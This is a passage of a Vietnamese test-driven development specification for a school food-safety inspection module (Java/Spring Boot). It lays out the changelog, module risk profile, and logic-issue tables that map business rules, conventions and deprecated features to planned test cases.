# TEST-DRIVEN DEVELOPMENT SPECIFICATION
# MF07 — Food Safety Inspection & Monitoring (+ Violation-Process)

| Field | Value |
|-------|-------|
| **Document ID** | `SFMS-MF07-TDD-001` |
| **Version** | `1.2` |
| **Date** | `2026-08-03` |
| **Status** | **`Approved`** |
| **Standard** | ISO/IEC/IEEE 29119-3:2021 — Software Testing Part 3: Test Documentation |
| **Document Owner** | Nguyễn Phương Thảo (ThaoNP) |
| **Author** | Nguyễn Phương Thảo — chủ module MF05/MF07/MF12, Lead Test/QA Reviewer |
| **Reviewed by** | **`[x] Bùi Quang Huy — §2 Traceability (UC/BR/MSG) — ✅ 2026-08-03`** · `[ ] Nguyễn Đức Mạnh — §5 Schema + §9 API — Pending` · `[ ] Trần Tuấn Minh — §8/§9 JSON shape — Pending` |
| **DPO Sign-off** | `[ ] Pending` *(module chạm PII: ảnh bằng chứng có thể chứa hình ảnh nhân viên bếp; `caterersRepresentativeId` là định danh cá nhân đại diện Nhà thầu trên biên bản vi phạm)* |
| **Approved by** | `[ ] Nguyễn Văn Nam — Final Approval Pending` |
| **Classification** | `Internal — Confidential` |

**References (nguồn oracle — mọi expected value trích từ đây, KHÔNG dùng giả định):**

| # | Nguồn | Dùng cho |
|---|-------|----------|
| 1 | `07_implement/MF07_Food_Safety_Inspection/TDS-MF07_Backend.md` (`SFMS-MF07-IMP-001`) | Spec kỹ thuật gốc — §5 schema, §8 interface, §9 API, §10 error code, §13 kịch bản, §16 auth matrix, §17 constraints C1–C14 |
| 2 | **`07_implement/00_Common_Conventions.md` (D1–D7) — ✅ Approved 2026-07-30** | **Quy ước ưu tiên CAO NHẤT.** Ghi đè ADR module khi xung đột (xem §2 L1–L4) |
| 3 | `02_Requirements/02_UseCases/MF07_Food_Safety_Inspection_Monitoring.md` | Normal/Alternative Flow của UC |
| 4 | `02_Requirements/03_TraceabilityMatrix/traceability_matrix.md` **§1.7** | Nguồn CHUẨN duy nhất của UC↔BR↔MSG cho MF07 (11 UC) |
| 5 | `02_Requirements/00_BusinessRules/business_rules.md` §8, §12, §18 | Nội dung BR |
| 6 | `02_Requirements/00_BusinessRules/error_message.md` | Chuỗi MSG nguyên văn (oracle của assert message) |
| 7 | **`00_Policies/` — QĐ 1246/QĐ-BYT** (Điều 3–5: Mẫu 1/2/3 kiểm thực ba bước) · Luật ATTP 55/2010/QH12 · TTLT 13/2016 | Căn cứ pháp lý của 3 bước + tính bất biến hồ sơ |
| 8 | `00_Policies/specialreport2173_1.md` | Mẫu biên bản vi phạm cho BR-211 (export PDF) |
| 9 | `03_Design/08_FrontEnd/Web/src/lib/api/mock-server.ts` + `db.ts` + `hooks.ts` | Hợp đồng REST (PATCH-semantics, `score >= 60` dòng 184–186) |
| 10 | `03_Design/08_FrontEnd/Web/src/lib/mock-data.ts` | **Nguồn fixture** (§3 TDS-05) — dùng ID thật, không bịa |
| 11 | `03_Design/08_FrontEnd/Web/scripts/semantic-audit.ts` §7 | Luật `PHAT_SUAT_DU_KIEM_THUC_TRUOT` |
| 12 | `03_Design/02_ADR/ADR-000.md` | Stack + stub external service (GPS no-op ở dev, object storage) |
| 13 | `07_implement/00_Team_Work_Assignment_Plan.md` §2b | Hợp đồng phân trang/search/filter dùng chung |

> **⚠️ RÀNG BUỘC STACK — tài liệu này KHÔNG dùng cú pháp mẫu của `PHASE-4_Test-Spec.md`.**
> Template gốc minh hoạ bằng TypeScript/Jest/Prisma. Dự án dùng **Java 25 LTS · Spring Boot 4.1.x · PostgreSQL 16 · Flyway · Spring Security + JWT · MapStruct · PDFBox** (BR-211).
> Test = **JUnit 5 + AssertJ + Mockito** (unit) · **`@SpringBootTest` + Testcontainers `PostgreSQLContainer` + MockMvc** (integration) · rollback = **Flyway migration bù** (KHÔNG `npx prisma migrate reset`) · fixture = **Java builder** (KHÔNG `makeEntity()` TypeScript).

> **⚠️ ÁP DỤNG `00_Common_Conventions.md` D1–D7 (Approved 2026-07-30).**
> Thứ tự ưu tiên khi xung đột: **`00_Common_Conventions.md` > ADR module (TDS §3) > hợp đồng mock FE** — đúng như chính TDS-MF07 §3 khai.
> Hệ quả cho tài liệu này: **D1** JSON `id` = `code` (PK là UUID) → DB assertion dùng `WHERE code = ?` · **D2** lỗi trong envelope `{"error":{"code","message","details"}}` → assert `$.error.code` · **D3** mọi path `/api/v1/...` · **D4** JSON ngày **ISO-8601** → **ghi đè** C12 (`dd/MM/yyyy`) · **D5** nhận `id` client, trùng → 409 · **D6** `MealType` = `BREAKFAST|LUNCH|SNACK` **SCREAMING_SNAKE** → **ghi đè** C12 (`meal` nhãn tiếng Việt) · **D7** `message` tiếng Anh nguyên văn `error_message.md`.

> **Quy ước TDD:** tài liệu này mô tả test cases **TRƯỚC** khi viết production code.
> Thứ tự: viết test (`*Test.java`) → chạy → xác nhận **FAIL 🔴** → implement → **PASS 🟢** → refactor 🔵.
> Không mark ✅ nếu `mvn verify` chưa xanh. Test data dùng school `SCH-001` / partner `SUP-001` (QA seed), **không dùng PII thật**.

---

## CHANGELOG

> **Policy 4.4 — Immutable History:** không xóa thông tin cũ.

| Ngày | Người thực hiện | Nội dung thay đổi |
|------|-----------------|-------------------|
| 2026-08-03 | Nguyễn Phương Thảo | **v1.2 — Nam + Huy xác nhận, 3 TC đổi từ "không có oracle" sang có oracle THẬT.** §2.3 (Nhóm C) viết lại. **CF-10 được Huy chốt chính thức hoá** ⇒ `business_rules.md` v2.1 cấp **BR-221**/**BR-222**; `MF07-TC-022` (`medicalReview*`), `MF07-TC-023` (`confirmStatus` + hồ sơ bản ký), `MF07-TC-SEC-009` đổi cột `Oracle Source` từ *"chưa có BR/UC nguồn — CF-10"* sang **BR-222 (UC-112)** / **BR-221 (UC-014)**. **CF-25 cũng chính thức hoá** (BR-095 + BR-183 có sẵn) ⇒ `MF07-TC-007` gỡ điều kiện `@Disabled`. **Điểm cốt lõi: 3 TC này MẠNH LÊN, không chỉ đổi nhãn.** File review cũ chỉ mô tả *field tồn tại*; BR-221/BR-222 mới là chỗ nói rõ field đó **KHÔNG được làm gì** ⇒ bổ sung được 5 assertion "không" mà trước 03/08 không viết nổi vì thiếu oracle: `medicalReviewResult=FAILED` **không** đổi `overall`, **không** làm `serving-gate` chuyển `allowed=false`, **không** sinh CAPA; `confirmStatus` chưa xác nhận **không** chặn `serving-gate`, **không** đổi `score`/`result`. Đây chính là hàng rào ngăn người sau "tiện tay" cho đánh giá của Y tế ghi đè kết luận của đơn vị thực hiện — hai chỉ số song song theo QĐ 1246. Thêm assert `ck_insp_medical_reason` (FAILED thiếu lý do → 422) và audit BR-170. **Huy ký §2 Traceability.** Gỡ ghi chú *"⚠️ ranh giới MF11 (L10)"* khỏi `TC-SEC-009` — nhóm field này chưa bao giờ thuộc MF11. **`MSG-145`…`MSG-148` đã có** ⇒ expected message của `INSP-091/092/079/083` nay trích được nguyên văn `error_message.md` v1.10 thay vì chuỗi tiếng Việt tự soạn (**D7**). |
| 2026-08-03 | Nguyễn Phương Thảo | **v1.1 — Bước 1 (`02_Module_Completion_Workflow.md` §7 việc 3). Status `Draft` → `Approved`.** Bộ 67 TC viết ngày 30/07, **trước khi D9–D13 tồn tại** — `grep -n "oneOf"` ra **0 kết quả** ⇒ không TC nào phủ. Bổ sung **§2.1-BIS (L23–L27)** và **2 TC bắt buộc**: **`MF07-TC-SEC-017`** (D11 — 4 vai trò phải thấy **cùng tập field**; kết luận là *"D11 không áp dụng"* vì BR-099 lọc **tập dòng** chứ không phải tập field, nhưng vẫn viết TC theo tiền lệ `TestSpec-MF06` TC-SEC-014) và **`MF07-TC-029`** (D12 — gửi field dẫn xuất + field **đúng tên sai kiểu** `coreTemp:"80"`, assert **DB không đổi một byte**; kèm 2 ca **200 là đúng** cho parse khoan dung `dd/MM/yyyy` và `"Bữa trưa"`, ghi rõ để người sửa test sau không "dọn" nhầm). Thêm **§2.1-TER**: **7 TC chuyển sang MF11** theo `M07-D07`/`M07-D08` (`TC-017/018/019/020/INT-011/SEC-014/SEC-016`) — giữ nguyên trong tài liệu (Policy 4.4, là nguồn cho MF11 chép) nhưng `@Disabled` và **không tính vào Exit Criteria**. **L1–L4 đã ĐÓNG** — `TDS-MF07` v1.2 nay khớp D1/D2/D4/D6, hai tài liệu hết lệch. **D13 là mục duy nhất không phải sửa gì**: `V900` đã có tài khoản ACTIVE thật cho cả 5 role MF07 dùng. Tổng: **62 TC chạy** (67 − 7 + 2), 69 dòng trong tài liệu. Đếm D11 toàn dự án: **2/13 → 3/13**. |
| 2026-07-30 | Nguyễn Phương Thảo | Khởi tạo v1.0 — TDD spec cho MF07. Nguồn: TDS-MF07_Backend.md (§13, §16, §17 C1–C14), **`00_Common_Conventions.md` D1–D7 (Approved 30/07)**, traceability §1.7 (11 UC), `business_rules.md` §8/§12/§18, `error_message.md`, QĐ 1246/QĐ-BYT, `semantic-audit.ts` §7, fixture từ `mock-data.ts`. Tổng **67 test case**: 28 unit · 16 security · 20 integration · 3 E2E. Ghi nhận **22 Logic Issue** (L1–L22): L1–L4 là **D1/D2/D4/D6 ghi đè** ADR/constraint của TDS; L5–L22 kế thừa CF-1…CF-32. |

---

## MỤC LỤC

1. [Thông tin Module](#1-thông-tin-module) · 1.1 [AI Generation Context](#11-ai-generation-context-case-20)
2. [Logic Issues Resolved](#2-logic-issues-resolved)
3. [Test Design Specification](#3-test-design-specification)
4. [Test Case Specification](#4-test-case-specification) · [Unit](#41-unit-test-cases) · [Security](#42-security-test-cases) · [Integration](#43-integration-test-cases) · [E2E](#44-e2e-test-cases)
5. [Red-Green-Refactor Tracker](#5-red-green-refactor-tracker) · 5.4 [Red Gate Protocol](#54-red-gate-protocol-case-20--gate-2)
6. [Entry / Exit Criteria](#6-entry--exit-criteria)
7. [Rollback Plan](#7-rollback-plan)
8. [CASE 2.0 Anti-Pattern Detection](#8-case-20-anti-pattern-detection)
9. [Phụ lục — Danh sách mã UC/BR/MSG đã trích dẫn](#9-phụ-lục--danh-sách-mã-ucbrmsg-đã-trích-dẫn)

---

## 1. Thông tin Module

| Field | Value |
|-------|-------|
| **Feature / Module ID** | `MF07` — Food Safety Inspection & Monitoring (gộp Violation-Process) |
| **Bounded Context** | Food Safety Assurance |
| **Spec gốc** | `SFMS-MF07-IMP-001` (`TDS-MF07_Backend.md`) |
| **Priority** | 🟡 **P2** — nhưng **BR-094 là chốt chặn của trục xương sống**, phải thông trước khi demo MF09 |
| **Số UC trong phạm vi** | **11** — UC-052, UC-065, UC-014, UC-027, UC-054, UC-112, UC-113, UC-115, UC-117, UC-124, UC-178 *(Deprecated 11/07/2026)*. ⚠️ `00_` §3 ghi 13 UC — xem **L5/CF-1** |
| **Data Classification** | `Internal` + **PII**: ảnh bằng chứng (có thể chứa hình ảnh nhân viên bếp) + `caterersRepresentativeId` (định danh cá nhân trên biên bản vi phạm) |
| **Compliance Scope** | **QĐ 1246/QĐ-BYT** (Điều 3–5, Mẫu 1/2/3) · **Luật ATTP 55/2010/QH12** · TTLT 13/2016 · PDPD (Luật 91/2025) |
| **Upstream Dependencies** | MF01 (JWT/RBAC), MF02 (`SchoolRecord`, geofence), MF04 (`Partner` — bếp/đơn vị suất ăn), MF05 (`Menu`/`dishId` của bữa được kiểm), MF06 (`InventoryBatch` — HSD ở Bước 1) |
| **Downstream Consumers** | **MF08** (lưu mẫu sau khi 3 bước ĐẠT — BR-105), **MF09** (chặn phát suất — BR-094, ràng buộc C3), **MF11** (CAPA tự sinh — BR-095; `ViolationRecord.sourceInspectionId`), MF12/MF13 (báo cáo tuân thủ) |
| **Package Java** | `com.sfms.mf07.{domain, repository, dto, mapper, service, web}` |
| **Test module** | `src/test/java/com/sfms/mf07/**` |
| **Migration** | Flyway `V12__mf07_inspection.sql` · `V13__mf07_seed_checklist.sql` (TDS §11.3) |

**Đặc thù rủi ro của module — quyết định mức độ nghiêm ngặt của test:**

> MF07 là **cổng an toàn cuối cùng trước khi bữa ăn tới miệng học sinh**. Khác với các module khác, lỗi ở đây có **hai lớp hậu quả**:
> 1. **Sức khỏe:** `serving-gate` (BR-094) trả sai `allowed=true` ⇒ bữa ăn chưa qua kiểm thực được phát ra. Đây là ca nghiêm trọng nhất trong toàn hệ thống.
> 2. **Pháp lý:** hồ sơ kiểm thực là **hồ sơ bắt buộc theo QĐ 1246** và biên bản vi phạm là **văn bản có ký tay 2 bên** (BR-211). Sửa/xoá được hồ sơ đã chốt ⇒ mất bằng chứng khi thanh tra hoặc điều tra ngộ độc.
>
> Vì vậy coverage mục tiêu **cao hơn MF05**: **≥ 90% line** cho `com.sfms.mf07.service`; **100% branch** cho `ThreeStepValidator` (BR-079), `ServingApprovalService` (BR-094/098), `Step2Validator`/`Step3Validator` (ngưỡng nhiệt độ BR-090/091), và `ViolationRecordService` gate BR-211.

### 1.1 AI Generation Context (CASE 2.0)

| Field | Value |
|-------|-------|
| **AI Assisted?** | `Yes` — soạn thảo có AI hỗ trợ, oracle do người xác nhận |
| **Constraint Source** | `TDS-MF07_Backend.md` §17.1 (C1–C14), §10 (error codes), §16 (auth matrix + bảng field-level), §13 (kịch bản); **`00_Common_Conventions.md` D1–D7** |
| **Constraints Injected** | C1 ba bước đúng thứ tự · C2 ngưỡng nhiệt độ `>=` chặn cứng · C3 bước trượt → CAPA + tái kiểm là phiên MỚI · C4 `serving-gate` là chốt chặn duy nhất · C5 "Không đạt" bắt buộc ảnh + lý do, GPS server-side · C6 điểm bếp <60 → cảnh báo, KHÔNG khóa bếp · C7 biên bản nhắm ĐƠN VỊ + gate ảnh ký · C8 row-level BR-099 · C9 `PUT` partial merge · C10 phân quyền theo FIELD · C11 không tin số client tính · C12 tên field JSON *(phần ngày/`meal` đã bị D4/D6 ghi đè — L3/L4)* · C13 CAPA do backend tạo · C14 checklist xoá = ẩn |
| **Model** | Claude Opus (`00_` §2c-4 — TestSpec = Opus vì oracle phải khớp BR/MSG) |
| **Trust Level** | `T2 → T3` (pending Red Gate §5.4) |
| **Oracle policy** | Mọi `Expected Result` **phải** có dòng `Oracle Source` trỏ BR/UC/MSG/điều luật/luật `semantic-audit.ts`. TC không có oracle → reject (AP-AI-001). |

---

## 2. Logic Issues Resolved

> **Bắt buộc điền trước khi viết test.** Test cases encode hành vi **đã sửa**.
> **L1–L4** là các chỗ `00_Common_Conventions.md` (D1–D7, Approved 30/07) **ghi đè** ADR/constraint trong TDS-MF07 — đây là loại Logic Issue quan trọng nhất vì TDS chưa được cập nhật lại.
> **L5–L22** kế thừa CF-1…CF-32 của TDS §2.3 — **không tự chọn bên đúng**, chỉ ghi rõ hành vi nào được test.

### 2.1. Nhóm A — `00_Common_Conventions.md` ghi đè TDS (ưu tiên xử lý trước)

| # | Quy ước | TDS-MF07 hiện viết | Hành vi được TEST | TC liên quan |
|---|---|---|---|---|
| **L1** | **D1** — JSON `id` = mã nghiệp vụ (`code`), PK là **UUID**; path param dùng `{code}` | §5.2 khai PK `VARCHAR(32/40)` = chính mã nghiệp vụ (nhóm "MF05, MF06, MF07, MF12" trong bảng D1) | Entity có `@Id UUID id` **+** `code VARCHAR(32) NOT NULL` + `UNIQUE(school_id, code)`; JSON trả `code` dưới tên `id` qua `@JsonProperty("id")`. **Mọi DB assertion trong tài liệu này dùng `WHERE code = ?`**, không phải `WHERE id = ?`. Path `GET /api/v1/inspections/INSP-20260724-L` vẫn đúng. | Toàn bộ TC-INT-*; rõ nhất ở `MF07-TC-INT-001`, `MF07-TC-INT-016` |
| **L2** | **D2** — envelope lỗi `{"error":{"code","message","details"}}` | §10 liệt kê code + message nhưng không khai envelope | Assert theo **JSON path** `$.error.code == "INSP-017"` và `$.error.message` = chuỗi nguyên văn `error_message.md`; `$.error.details` là **mảng**, không bao giờ `null`. | Toàn bộ TC error path |
| **L3** | **D4** — JSON ngày **luôn ISO-8601** (`"2026-07-24"` / `"2026-07-24T02:15:00Z"`); **bỏ** mọi `@JsonFormat("dd/MM/yyyy")` | §17.1 **C12** ghi *"Ngày format `dd/MM/yyyy [HH:mm]`"*; CF-22 chốt *"format ra `dd/MM/yyyy` ở tầng response"* | **Assert ISO** cho `date`, `occurredAt`, `signedAt`, `medicalReviewAt`, `recordPdfExportedAt`, `pdfGeneratedAt`. Backend **vẫn parse cả 2 dạng** khi NHẬN (mock đang gửi `dd/MM/yyyy`) nhưng **TRẢ VỀ ISO**. ⚠️ D4 ghi rõ *"không sửa seed `mock-data.ts` ở đợt này"* → FE phải thêm `lib/format.ts` ở tầng render (việc của Minh). | `MF07-TC-024`, `MF07-TC-E2E-003` |
| **L4** | **D6** — `MealType` = `BREAKFAST` / `LUNCH` / `SNACK` (**SCREAMING_SNAKE**), nhãn tiếng Việt ở `lib/labels.ts`; nhãn chốt của `SNACK` là **"Bữa phụ"** | §17.1 **C12** ghi *"`meal` (nhãn tiếng Việt)"*; CF-8 ghi mock dùng `"Bữa sáng"/"Bữa trưa"/"Bữa chiều"` | **Assert `"meal": "LUNCH"`** trong JSON; DB lưu enum. Backend **parse khoan dung** nhãn tiếng Việt khi nhận (mock đang gửi vậy) nhưng **trả về SCREAMING_SNAKE**. ⚠️ D6 chỉ rõ thêm: nhãn `"Bữa chiều"` của mock **sai** — chốt **"Bữa phụ"** cho `SNACK`. | `MF07-TC-025` |

> **✅ ĐÃ ĐÓNG 2026-08-03 — `TDS-MF07_Backend.md` v1.2 đã cập nhật.** L1–L4 nay khớp TDS: `M07-D01` (D1 — PK UUID + `code`), `M07-D11` (D4 — response luôn ISO), `M07-D12` (D6 — `meal` SCREAMING_SNAKE), và D2 khai rõ trong §10. Hai tài liệu **không còn lệch**. Ghi chú cũ *"TDS cần một bản cập nhật"* giữ lại theo Policy 4.4.

### 2.1-BIS. Nhóm A' — D9/D10-BIS/D11/D12/D13 (bổ sung 2026-08-03, Bước 1)

> `TestSpec-MF07` v1.0 viết ngày 30/07, khi **D9–D13 chưa tồn tại** (D9/D10 Approved 31/07; D11–D13 đề xuất 02/08 tại `02_Module_Completion_Workflow.md` §6). Kiểm bằng `grep -n "oneOf" TestSpec-MF07*.md` ngày 03/08 → **0 kết quả** ⇒ **không TC nào phủ**. Bốn dòng dưới là phần bù.

| # | Quy ước | TDS-MF07 v1.1 viết | Hành vi được TEST | TC |
|---|---|---|---|---|
| **L23** | **D9** — audit tự động qua `BaseEntity`; entity **không** khai `created_at`/`updated_at`/`created_by`/`updated_by`, nhưng **DDL vẫn tạo đủ 4 cột** | §5.2 entity `InspectionSession` tự khai `createdAt`/`updatedAt`; DDL 3 bảng chỉ có 2/4 cột | Assert `created_by` **tự điền** email actor sau `POST` mà service **không** gán tay; assert 4 cột tồn tại ở cả 5 bảng chính. ⚠️ Đây là lỗi **đắt nhất**: khai lại = Hibernate duplicate column ⇒ **build đỏ ngay**, không phải sai hợp đồng âm thầm như D1 | `MF07-TC-INT-021` *(gộp vào bộ smoke schema)* |
| **L24** | **D10-BIS** — ảnh bằng chứng là tài liệu **riêng tư**: multipart qua backend (không presign), lưu `storage_key`, JSON trả **id tài liệu**, tải xuống có `@PreAuthorize` + audit | §5.2 v1.1 khai `url VARCHAR(500)` (URL công khai) | Assert JSON **không** chứa URL trực tiếp tới file; `GET /inspections/{id}/evidences/{evidenceId}` bằng vai trò không có quyền → **403**, và có bản ghi audit | `MF07-TC-SEC-018` *(chờ viết cùng đợt upload)* |
| **L25** | **D11** — response đổi shape theo vai trò phải khai `oneOf` | không có mục nào | **Kết luận: không áp dụng** (BR-099 lọc tập DÒNG, không phải tập FIELD ⇒ `M07-D13` chốt một DTO). **Nhưng vẫn phải có TC** assert điều đó — vì MF02/MF03 cũng "không có vấn đề" lúc viết TDS rồi về sau mới thêm nhánh rút gọn | **`MF07-TC-SEC-017`** 🆕 |
| **L26** | **D12** — key JSON phải khớp **cả tên lẫn kiểu** hai chiều; field dẫn xuất read-only | CF-26 có nêu đúng **một** ca (`score` do FE tính) nhưng không nâng thành luật; không có mục nào về "đúng tên sai kiểu" | Gửi (a) 4 field dẫn xuất và (b) `coreTemp: "80"` (string thay number) → **422 + DB không đổi một byte**. Kèm 2 ca **200 là đúng**: `date: "03/08/2026"` và `mealType: "Bữa trưa"` (parse khoan dung, trả về chuẩn hoá) | **`MF07-TC-029`** 🆕 |

| **L27** | **D13** — seed đủ role cho mọi `@PreAuthorize` | — | ✅ **ĐÃ ĐỦ, không phải sửa gì** — `V900` có tài khoản ACTIVE thật cho cả 5 role MF07 dùng (`M07-D15`). MF07 là module đầu tiên trong 8 module rà mà D13 không phải bổ sung seed. **Hệ quả cho test:** mọi TC bảo mật phụ thuộc claim ngoài role (`partnerId` của BR-099) **phải dùng tài khoản seed thật**, **không** `@WithMockUser` | `MF07-TC-SEC-017`, `MF07-TC-SEC-006`…`010` |

### 2.1-TER. Nhóm A'' — TC chuyển sang MF11 (`M07-D07`, 2026-08-03)

> `TDS-MF07` §2.4 `M07-D07`/`M07-D08` gỡ `violation_records` + `corrective_actions` + toàn bộ `/api/v1/violations*` sang **MF11**. Lý do: `TDS-MF11_Backend.md` dòng **938** và **984** đã khai `CREATE TABLE corrective_actions` / `CREATE TABLE violation_records`, và §9 đã khai cùng path ⇒ để nguyên là **Flyway đỏ + app không khởi động**.
>
> **7 TC dưới đây GIỮ NGUYÊN trong tài liệu** (Policy 4.4 — chúng là nguồn cho MF11 chép, chứa 13 cột CF-7/CF-28/CF-31 chỉ có ở đây), nhưng **đánh dấu `@Disabled("Chuyển MF11 — M07-D07")`** và **không tính vào Exit Criteria của MF07**:
>
> `MF07-TC-017` (export PDF) · `MF07-TC-018` (dò tái diễn BR-187) · `MF07-TC-019` (từ chối field BR-184 deprecated) · `MF07-TC-020` (gate MSG-095) · `MF07-TC-INT-011` (PDF server-side) · `MF07-TC-SEC-014` (gate chặn cứng) · `MF07-TC-SEC-016` (sanitize HTML).
>
> **Tổng TC MF07 sau đợt này: 67 − 7 (chuyển MF11) + 2 (D11/D12 bắt buộc) = 62 chạy trong `mvn verify`**, 69 dòng trong tài liệu.

> **Ghi chú bắt buộc cho Mạnh & Minh:** TestSpec này viết theo **D1–D13** (nguồn ưu tiên cao nhất). Khi TDS và TestSpec lệch nhau, **không** sửa TestSpec để khớp TDS cũ — sửa TDS.

### 2.2. Nhóm B — mâu thuẫn nguồn kế thừa từ TDS §2.3

| # | Nguồn CF | Spec gốc (sai / thiếu / lệch) | Thực tế | Fix áp dụng trong test |
|---|---|---|---|---|
| **L5** | CF-1 | §1.7 có **UC-065** "Record Meals Before Serving"; UC file **không có**. UC file có **UC-062**; §1.7 **không có**. `00_` §3 ghi MF07 = **13 UC**, §1.7 chỉ **11** | traceability §1.7 vs UC file vs bảng phân công | Test bám **§1.7** (có UC-065, không UC-062). Nội dung Bước 1 mô tả ở UC-062 dùng làm **nguồn nghiệp vụ** cho `Step1Fresh/Step1Dry` và ghi rõ nguồn. **Không** TC nào gán mã UC-062. Chờ Huy chốt chênh 11 vs 13. |
| **L6** | CF-2 | UC file UC-014 AF1: điểm <60% → **khóa vận hành bếp** + MSG-024 | **Descope 05/07/2026**: chỉ **cảnh báo** School Administration (MSG-093), bếp vận hành bình thường; mock theo bản mới | `MF07-TC-012`/`TC-013`/`TC-014` test bản **đã descope**: `score < 60` → `result=FAILED` + cảnh báo, **`serving-gate` VẪN `allowed=true`** nếu kiểm thực PASSED. **Không** TC nào dùng MSG-024. |
| **L7** | CF-3 | §1.7 vẫn liệt kê **BR-089** cho UC-054 và gán **MSG-055/MSG-059** | BR-089 **Deprecated 11/07/2026** (không quản lý IoT) | **Không** TC nào test giám sát/cảnh báo **tự động**. `MF07-TC-021` chỉ test MSG-055/059 phát khi **nhân viên nhập tay** giá trị ngoài dải. |
| **L8** | CF-4 | `data_model.puml` còn `FridgeTempLog` | không có resource trong `db.ts`; BR-089 deprecated | **Không** TC nào chạm bảng `fridge_temp_logs`; assert bảng **không tồn tại** trong `MF07-TC-INT-015`. |
| **L9** | CF-5 | UC file UC-014 bước 4 đòi *"quarterly pest control certificate"*; mock còn cờ `pestControlValid` | BR-102 (27/07/2026) bỏ mô hình chứng nhận/nhật ký độc lập; resource `pest-control-log` đã gỡ | Fixture **giữ** cột `pest_control_valid` (màn School Admin đang đọc) nhưng **không** TC nào test endpoint nhập liệu riêng; côn trùng test qua mục checklist `CLI-3-8`/`CLI-4-6`. |
| **L10** | CF-6 | `00_` §3 ghi MF07 = *"Kiểm thực 3 bước + vi phạm quy trình"*; §1.7 giữ dòng UC-178 | UC-178 **Deprecated 11/07/2026**, dialog nhập gộp về **UC-179 (MF11)** | Test **phạm vi MF07** = bảng `violation_records` + API CRUD/PDF (vì `sourceInspectionId` trỏ phiên kiểm thực). **Luồng phê duyệt xử lý (UC-180/182) KHÔNG test ở đây** — thuộc MF11. Ranh giới ghi rõ ở mỗi TC vi phạm. Chờ **Nam** chốt để 2 module không gen trùng entity. |
| **L11** | CF-7 | mock `ViolationRecord` còn `type: "Quy trình"\|"Nhân sự"`, `staffName`, `staffPosition`, `disciplinaryLevel`; 3 seed đang dùng | **BR-184 Deprecated 26/07/2026** — gộp vào BR-183, bỏ biên bản nhắm cá nhân | Fixture **giữ** các cột (dữ liệu lịch sử, mock ghi rõ *"KHÔNG xoá field"*); `MF07-TC-019` assert **API tạo mới TỪ CHỐI** `staffName`/`staffPosition`/`disciplinaryLevel` → 422; dùng `unit_sanction_level` + `caterers_representative_id`. |
| **L12** | CF-14 | BR-095 nói *"hệ thống phải tự động tạo CAPA"* | **FE đang gọi tay** `POST /corrective-actions` sau khi ghi bước trượt (2 call-site); đóng tab ⇒ **không CAPA nào được tạo**, luật mất hiệu lực im lặng | `MF07-TC-008` + `MF07-TC-INT-008` assert backend **tự tạo CAPA trong CÙNG transaction** ghi bước trượt. Thêm assert **không tạo trùng** khi FE cũng gọi (idempotency key = `sourceInspectionId + step`). **Ưu tiên cao.** |
| **L13** | CF-15 | FE `DELETE /checklist-groups/{id}` = **xoá cứng** | BR-210: *"không xóa dữ liệu lịch sử — chỉ ẩn hạng mục khỏi phiên mới"*; MSG-094 = cảnh báo xác nhận | `MF07-TC-016` assert `DELETE` = **soft-delete** (`is_active=false`); đã được phiên đã lưu tham chiếu → **409 + MSG-094**, chờ `?confirmed=true`; `checklist_item_results` cũ **giữ nguyên**. |
| **L14** | CF-16 | FE tự dò tái diễn client-side rồi **gửi `repeatSuspect`** lên | BR-187: hệ thống dò theo `caterersRepresentativeId` + severity ≥ MEDIUM + 90 ngày | `MF07-TC-018` assert backend **tự dò**, **bỏ qua** `repeatSuspect` FE gửi (kể cả khi FE gửi `false` mà thực tế có tái diễn). |
| **L15** | CF-18 | `coSigner` gán **ngay lúc tạo phiên**, giá trị cứng `"Ngô Thị Hà (Y tế)"`, FE không bao giờ cập nhật | BR-099 + QĐ 1246 Điều 5: đồng ký **SAU** khi hoàn tất 3 bước | `MF07-TC-010` + `MF07-TC-INT-001` test `POST /inspections/{code}/co-sign` là **bước riêng**; assert `coSigner` gán sẵn lúc tạo **không** được coi là bằng chứng ký (`co_signed_at` phải null tới khi gọi endpoint). ⚠️ Chờ Huy/Nam chốt rồi Minh bổ sung nút. |
| **L16** | CF-19 | Không nút nào tạo phiên tái kiểm; phiên `FAILED` là ngõ cụt | BR-096 + MSG-056 yêu cầu tái kiểm tra | `MF07-TC-009` + `MF07-TC-INT-014` test `POST /inspections/{code}/reinspect` tạo **phiên MỚI**, phiên cũ **không đổi một byte nào**. |
| **L17** | CF-20 | Màn phát suất tải `GET /inspections?pageSize=100` rồi **tự lọc client-side** để quyết định cho phát suất | BR-094 + ràng buộc C3 `data_model.puml` | `MF07-TC-INT-002`/`003` + `MF07-TC-E2E-001` test `GET /inspections/serving-gate` là **chốt chặn duy nhất**; `MF07-TC-SEC-015` assert MF09 **không** có đường vòng nào khác (AP-AI-010). |
| **L18** | CF-21 | Xuất PDF biên bản **render tại browser** (`window.open` + `document.write`) | BR-211: *"hệ thống xuất PDF theo mẫu `00_Policies/specialreport2173_1.md`"* | `MF07-TC-017` + `MF07-TC-INT-011` test `POST /violations/{code}/export-pdf` sinh PDF **server-side (PDFBox)**; assert byte-level: PDF hợp lệ, có `sha256`, **giống nhau giữa 2 lần gọi** (bản in phải đồng nhất giữa các máy). |
| **L19** | CF-24 | Bước 3 **không có ô nhập `holdingTemp`** trong `Step3Row` của mock | BR-091 (≥60°C) ⇒ luật **không có nguồn dữ liệu nào**. ⚠️ Và BR-091 **không có MSG riêng** (`TDS` §10 ghi `INSP-091` = *"(không có MSG riêng)"*) — **không** được mượn MSG-020 (chuỗi đó là *"Retention refrigerator temperature is out of safe range (2-8°C)"*, thuộc **BR-110/MF08**, khác nghiệp vụ) | `MF07-TC-005` viết đầy đủ nhưng **`@Disabled("Chờ CF-24 — Minh bổ sung ô nhập holdingTemp")`**; CHECK constraint `ck_insp_holding_temp` **chỉ ENABLE sau khi** FE có ô nhập — bật ngay sẽ **chặn mọi phiên hợp lệ**. `MF07-TC-INT-013` assert constraint đang ở trạng thái **chưa enable**. |
| **L20** | CF-25 | Dialog thu `severity` + `witness` khi ghi bước KHÔNG ĐẠT nhưng **vứt bỏ** (chỉ đưa vào chuỗi toast) | BR-095 (*ghi nhận chi tiết không tuân thủ*) + BR-183 (dữ liệu để nâng thành biên bản) | `MF07-TC-007` assert 4 cột `fail_step`/`fail_reason`/`fail_severity`/`fail_witness` **được lưu**. ✅ **ĐÓNG 2026-08-03 — Huy chốt CHÍNH THỨC HOÁ**: field thật, oracle là **BR-095 + BR-183** (không cần BR mới). TC chạy bình thường, **không** `@Disabled`. |
